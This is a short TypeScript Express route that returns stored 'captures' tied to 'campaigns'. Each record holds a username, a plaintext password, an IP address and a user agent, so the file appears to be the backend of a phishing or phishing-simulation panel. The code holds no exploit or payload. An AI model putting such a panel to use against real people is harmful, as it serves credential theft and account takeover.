import { Router, type IRouter } from "express";
import { db, capturesTable, campaignsTable } from "@workspace/db";
import { eq, desc } from "drizzle-orm";
import { ListCapturesQueryParams } from "@workspace/api-zod";

const router: IRouter = Router();

router.get("/captures", async (req, res) => {
  const query = ListCapturesQueryParams.parse({ campaignId: req.query.campaignId ? Number(req.query.campaignId) : undefined });

  const captures = await db
    .select({
      id: capturesTable.id,
      campaignId: capturesTable.campaignId,
      campaignName: campaignsTable.name,
      username: capturesTable.username,
      password: capturesTable.password,
      ipAddress: capturesTable.ipAddress,
      userAgent: capturesTable.userAgent,
      capturedAt: capturesTable.capturedAt,
    })
    .from(capturesTable)
    .leftJoin(campaignsTable, eq(capturesTable.campaignId, campaignsTable.id))
    .where(query.campaignId ? eq(capturesTable.campaignId, query.campaignId) : undefined)
    .orderBy(desc(capturesTable.capturedAt));

  res.json(captures.map(c => ({
    ...c,
    capturedAt: c.capturedAt.toISOString(),
  })));
});

export default router;
